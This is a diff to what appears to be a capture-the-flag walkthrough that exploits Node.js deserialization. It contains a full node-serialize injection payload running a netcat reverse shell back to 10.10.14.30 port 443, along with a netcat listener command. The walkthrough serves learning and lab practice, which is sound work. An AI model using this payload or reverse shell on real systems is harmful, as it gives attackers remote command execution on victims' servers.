@@ -172,7 +172,8 @@ Linux kali 4.19.0-kali5-amd64 #1 SMP Debian 4.19.37-6kali1 (2019-07-22) x86_64 G
 {% endhighlight %}
 
 By combining previous information, we can obtain the payload.<br>
-Also, we need a reverse shell payload which we don't need to use both single quote and double quote.
+Also, we need a reverse shell payload which we don't need to use both single quote and double quote.<br>
+Meaning we have to merge the followings.
 {% highlight shell %}
 {"username":"Dummy","country":"Idk Probably Somewhere Dumb","city":"Lametown","num":"2+2"}
 {% endhighlight %}
@@ -183,13 +184,12 @@ Also, we need a reverse shell payload which we don't need to use both single quo
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.30 443 >/tmp/f
 {% endhighlight %}
 
-Combaine these information. we can get following payload. (Don't forget to remove "\n"!!)
+Full Payload:
 {% highlight shell %}
-root@kali:~# cat payload.txt 
 {"username":"Dummy","country":"Lameville","city":"Lametown","num":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.30 443 >/tmp/f', function(error, stdout, stderr) { console.log(stdout) })"}
 {% endhighlight %}
 
-Now we had a payload.<br>
+Now we had a full payload.<br>
 We need base64 encoding for the payload and make sure to run a netcat listener.
 {% highlight shell %}
 root@kali:~# nc -nlvp 443
